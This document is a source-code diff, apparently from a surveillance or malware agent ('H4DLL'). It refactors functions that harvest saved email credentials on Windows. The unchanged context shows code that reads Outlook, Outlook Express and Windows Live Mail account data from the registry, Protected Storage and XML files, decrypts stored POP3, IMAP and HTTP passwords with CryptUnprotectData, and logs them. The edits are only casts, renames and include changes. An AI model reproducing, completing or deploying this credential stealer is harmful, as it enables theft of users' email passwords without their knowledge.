@@ -1,12 +1,12 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-#include <windows.h>
+#include "../../H4DLL/common.h"
 
-#include "..\common.h"
 #import "pstorec.dll" no_namespace
 #include <WinCred.h>
 
@@ -33,7 +33,7 @@ typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *
 
 // ----------------------- PSTORAGE OutlookExpress ------------------------
 
-void DumpOutlook(char *base_reg)
+void dumpOutlook(const char *base_reg)
 {
 	HKEY hkeyresult, hkeyresult1;
 	char name[200],skey[400];
@@ -290,11 +290,11 @@ void DumpPStorage()
 							if(FNC(lstrcmpW)(OutlookData[i].POPpass, itemName)==0){				   			
 								//bDeletedOEAccount=FALSE;
 								if (OutlookData[i].type == MAIL_IMAP)
-									LogPassword(L"Outlook Express IMAP", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
+									LogPassword((WCHAR*)L"Outlook Express IMAP", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
 								else if (OutlookData[i].type == MAIL_POP3)
-									LogPassword(L"Outlook Express POP3", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
+									LogPassword((WCHAR*)L"Outlook Express POP3", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
 								else if (OutlookData[i].type == MAIL_HTTP)
-									LogPassword(L"Outlook Express HTTP", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
+									LogPassword((WCHAR*)L"Outlook Express HTTP", OutlookData[i].POPserver,  OutlookData[i].POPuser, pass);
 
 								break;
 							}
@@ -379,7 +379,7 @@ void DumpOutlook2003()
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
 					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
-					LogPassword(L"Outlook 2003/2010 HTTP", server, user, password);
+					LogPassword((WCHAR*)L"Outlook 2003/2010 HTTP", server, user, password);
 					LocalFree(dbout.pbData);
 				}
 			}
@@ -400,7 +400,7 @@ void DumpOutlook2003()
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
 					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
-					LogPassword(L"Outlook 2003/2010 POP3", server, user, password);
+					LogPassword((WCHAR *)L"Outlook 2003/2010 POP3", server, user, password);
 					LocalFree(dbout.pbData);
 				}
 			}
@@ -421,7 +421,7 @@ void DumpOutlook2003()
 				dbin.pbData = &(data[1]);
 				if (tmp_size>1 && pfCryptUnprotectData(&dbin, NULL, NULL, NULL, NULL, 1, &dbout)) {
 					_snwprintf_s(password, sizeof(password)/sizeof(WCHAR), _TRUNCATE, L"%s", dbout.pbData);
-					LogPassword(L"Outlook 2003/2010 IMAP", server, user, password);
+					LogPassword((WCHAR*)L"Outlook 2003/2010 IMAP", server, user, password);
 					LocalFree(dbout.pbData);
 				}
 			}
@@ -503,7 +503,7 @@ BOOL GetXMLMailAccount(WCHAR *account_dir, WCHAR *server, WCHAR *service, WCHAR 
 {
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 	DWORD size_low, dummy;
-	WCHAR *data;
+	WCHAR* data = NULL;
 
 	if (!account_dir || !server || !service || !user || !password)
 		return FALSE;
@@ -522,17 +522,17 @@ BOOL GetXMLMailAccount(WCHAR *account_dir, WCHAR *server, WCHAR *service, WCHAR 
 			break;
 		CloseHandle(hFile);
 
-		if (GetXMLNode(data, L"<IMAP_User_Name", user))  {
+		if (GetXMLNode(data, (WCHAR*)L"<IMAP_User_Name", user))  {
 			_snwprintf_s(service, GENERIC_FIELD_LEN, _TRUNCATE, L"Windows Live Mail IMAP");			
-			if ( !GetXMLNode(data, L"<IMAP_Password2", password) )
+			if ( !GetXMLNode(data, (WCHAR*)L"<IMAP_Password2", password) )
 				password[0] = 0;
-			if ( !GetXMLNode(data, L"<IMAP_Server", server) )
+			if ( !GetXMLNode(data, (WCHAR*)L"<IMAP_Server", server) )
 				server[0] = 0;
-		} else if (GetXMLNode(data, L"<POP3_User_Name", user))  {
+		} else if (GetXMLNode(data, (WCHAR*)L"<POP3_User_Name", user))  {
 			_snwprintf_s(service, GENERIC_FIELD_LEN, _TRUNCATE, L"Windows Live Mail POP3");			
-			if ( !GetXMLNode(data, L"<POP3_Password2", password) )
+			if ( !GetXMLNode(data, (WCHAR*)L"<POP3_Password2", password) )
 				password[0] = 0;
-			if ( !GetXMLNode(data, L"<POP3_Server", server) )
+			if ( !GetXMLNode(data, (WCHAR*)L"<POP3_Server", server) )
 				server[0] = 0;
 		} else {
 			free(data);
@@ -618,8 +618,8 @@ int DumpOutlook(void)
 	if (!OutlookData)
 		return 0;
 
-	DumpOutlook("Software\\Microsoft\\Internet Account Manager\\Accounts");
-	DumpOutlook("Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts");
+	dumpOutlook("Software\\Microsoft\\Internet Account Manager\\Accounts");
+	dumpOutlook("Software\\Microsoft\\Office\\Outlook\\OMI Account Manager\\Accounts");
 	DumpOutlookXP();
 	DumpPStorage();
 	DumpOutlook2003();
